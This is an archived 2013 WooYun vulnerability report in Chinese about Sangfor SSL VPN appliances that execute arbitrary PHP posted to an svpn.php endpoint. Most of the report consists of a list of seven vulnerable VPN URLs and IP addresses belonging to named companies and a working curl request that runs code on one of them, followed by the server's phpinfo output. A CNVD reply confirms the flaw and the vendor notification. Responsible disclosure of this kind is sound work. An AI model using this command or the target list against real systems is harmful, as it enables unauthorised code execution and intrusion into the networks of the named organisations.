<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		宅急送等企业因某vpn设备造成内网泄密  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		宅急送等企业因某vpn设备造成内网泄密  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/夜不眠">夜不眠</a> 
</li><li>提交时间：		2013-06-02 14:09</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-06-02：	细节已通知厂商并且等待厂商处理中<br/>
									2013-06-03：	厂商已经确认，细节仅向厂商公开<br/>
									2013-06-13：	细节向核心白帽子及相关领域专家公开<br/>
									2013-06-23：	细节向普通白帽子公开<br/>
									2013-07-03：	细节向实习白帽子公开<br/>
									2013-07-17：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">宅急送等企业某设备造成内网泄密包括些国企</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>http://vpn.zjs.com.cn:1000/cgi-bin/php-cgi/html/svpn.php 宅急送<br />
<br />
http://220.231.41.220:1000/cgi-bin/php-cgi/html/svpn.php 中纺集团<br />
<br />
https://61.163.104.181:4430/cgi-bin/php-cgi/html/svpn.php 郑州煤炭集团<br />
<br />
http://sslvpn.cifi.com.cn:1000/cgi-bin/php-cgi/html/svpn.php 旭辉集团<br />
<br />
http://60.216.53.122:1000/cgi-bin/php-cgi/html/svpn.php  山东浪潮<br />
<br />
http://222.85.86.119:1000/cgi-bin/php-cgi/html/svpn.php  郑州日产<br />
<br />
http://218.29.139.76:1000//cgi-bin/php-cgi/html/svpn.php 中原高速<br />
<br />
<br />
原漏洞 http://wooyun.org/bugs/wooyun-2010-017323</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>curl http://vpn.zjs.com.cn:1000/cgi-bin/php-cgi/html/svpn.php -d &#039;cmd=phpinfo();&#039;<br />
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;DTD/xhtml1-transitional.dtd&quot;&gt;<br />
&lt;html&gt;&lt;head&gt;<br />
&lt;style type=&quot;text/css&quot;&gt;<br />
body {background-color: #ffffff; color: #000000;}<br />
body, td, th, h1, h2 {font-family: sans-serif;}<br />
pre {margin: 0px; font-family: monospace;}<br />
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}<br />
a:hover {text-decoration: underline;}<br />
table {border-collapse: collapse;}<br />
.center {text-align: center;}<br />
.center table { margin-left: auto; margin-right: auto; text-align: left;}<br />
.center th { text-align: center !important; }<br />
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}<br />
h1 {font-size: 150%;}<br />
h2 {font-size: 125%;}<br />
.p {text-align: left;}<br />
.e {background-color: #ccccff; font-weight: bold; color: #000000;}<br />
.h {background-color: #9999cc; font-weight: bold; color: #000000;}<br />
.v {background-color: #cccccc; color: #000000;}<br />
.vr {background-color: #cccccc; text-align: right; color: #000000;}<br />
img {float: right; border: 0px;}<br />
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}<br />
&lt;/style&gt;<br />
&lt;title&gt;phpinfo()&lt;/title&gt;&lt;meta name=&quot;ROBOTS&quot; content=&quot;NOINDEX,NOFOLLOW,NOARCHIVE&quot; /&gt;&lt;/head&gt;<br />
&lt;body&gt;&lt;div class=&quot;center&quot;&gt;<br />
&lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; width=&quot;600&quot;&gt;<br />
&lt;tr class=&quot;h&quot;&gt;&lt;td&gt;<br />
&lt;a href=&quot;http://www.php.net/&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;/cgi-bin/php-cgi?=PHPE9568F34-D428-11d2-A769-00AA001ACF42&quot; alt=&quot;PHP Logo&quot; /&gt;&lt;/a&gt;&lt;h1 class=&quot;p&quot;&gt;PHP Version 5.3.2&lt;/h1&gt;<br />
&lt;/td&gt;&lt;/tr&gt;<br />
&lt;/table&gt;&lt;br /&gt;<br />
&lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; width=&quot;600&quot;&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;Linux Sangfor 2.4.32-web100-bic #86 SMP Fri Apr 8 14:26:30 CST 2011 i686 &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Build Date &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;Mar  2 2013 11:57:29 &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Configure Command &lt;/td&gt;&lt;td class=&quot;v&quot;&gt; &amp;#039;./configure&amp;#039;  &amp;#039;--disable-all&amp;#039; &amp;#039;--with-pcre-regex&amp;#039; &amp;#039;--enable-filter&amp;#039; &amp;#039;--enable-hash&amp;#039; &amp;#039;--enable-json&amp;#039; &amp;#039;--enable-posix&amp;#039; &amp;#039;--enable-session&amp;#039; &amp;#039;--enable-dba&amp;#039; &amp;#039;--enable-ftp&amp;#039; &amp;#039;--enable-sysvmsg&amp;#039; &amp;#039;--enable-sysvsem&amp;#039; &amp;#039;--enable-sysvshm&amp;#039; &amp;#039;--enable-pdo&amp;#039; &amp;#039;--enable-sockets&amp;#039; &amp;#039;--with-pdo-sqlite=/usr/local/sqlite3&amp;#039; &amp;#039;--with-qdbm=/usr/local/qdbm14&amp;#039; &amp;#039;--enable-inifile&amp;#039; &amp;#039;--with-gettext&amp;#039; &amp;#039;--with-iconv=/usr/local&amp;#039; &amp;#039;--enable-dom&amp;#039; &amp;#039;--enable-libxml&amp;#039; &amp;#039;--with-libxml-dir=/usr/local/libxml2&amp;#039; &amp;#039;--enable-mbstring=all&amp;#039; &amp;#039;--with-svpn_php=/usr/local/M50&amp;#039; &amp;#039;--with-strdes&amp;#039; &amp;#039;--with-curl&amp;#039; &amp;#039;--with-gd=/usr/local&amp;#039; &amp;#039;--enable-gd-native-ttf&amp;#039; &amp;#039;--with-freetype-dir=/usr/local&amp;#039; &amp;#039;--disable-cli&amp;#039; &amp;#039;--with-ldap=/usr/local/openldap&amp;#039; &amp;#039;--enable-pcntl&amp;#039; &amp;#039;--with-zlib-dir=/usr&amp;#039; &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Server API &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;CGI/FastCGI &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Virtual Directory Support &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;disabled &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Configuration File (php.ini) Path &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;/usr/local/lib &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Loaded Configuration File &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;/app/usr/local/lib/php.ini &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Scan this dir for additional .ini files &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(none) &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Additional .ini files parsed &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(none) &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP API &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;20090626 &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Extension &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;20090626 &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;220090626 &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;API220090626,NTS &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;API20090626,NTS &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Debug Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;no &lt;/td&gt;&lt;/tr&gt;<br />
&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Thread Safety &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;disabled &lt;/td&gt;&lt;/tr&gt;</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">Da Bu Ding </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/夜不眠" title="夜不眠">夜不眠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-025003" title="宅急送等企业因某vpn设备造成内网泄密">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：15 </p>
													<p class="detail">确认时间：2013-06-03 22:32</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD确认并复现所述情况，为版本为升级所致（&lt;=M5.6），已经在3日上午根据测试结果通报给设备生产厂商（深信服公司），由于相关客户未在CNCERT以往处置的政府或重要单位列表，将由CNCERT监督生产厂商做好用户应急响应工作。<br />
<br />
按通用软件漏洞进行评分，rank 15。同时也请白帽子提供检测发现目标的方法，以便后续深入检测，谢谢。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="25003";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
